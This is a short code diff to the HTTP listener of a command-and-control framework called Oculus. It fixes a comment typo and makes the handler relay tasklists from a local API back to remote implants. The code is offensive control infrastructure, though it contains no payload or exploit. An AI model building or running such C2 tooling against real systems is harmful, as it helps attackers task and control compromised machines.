@@ -22,7 +22,7 @@ sys.path.append("../")
 # WHAT THIS DOES
 # http.py is a flexible HTTP c2 handler. It binds to a given port and handles communications to and from remote agents
 # The Oculus HTTP c2 Handler is capable of managing communications for multiple and disparate implants without the need for separate ports or infrastructure
-# Listeners are standalone an may be invoke directly or externally
+# Listeners are standalone an may be invoked directly or externally
 
 class Listener:
     def Start(self, NAME, TYPE, LPORT, LHOST):
@@ -72,9 +72,10 @@ class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
        # Oculus should manage tasks and only return new taskings
        # Listener should send agent token in api request
        res = requests.post('http://localhost:29000/api/c2', data=self.data_string)
-
+       data = res.json()
+       tasklist = json.dumps(data)
        # Respond to agent with tasklist
-       self.wfile.write({})
+       self.wfile.write(tasklist)
 
        return
 
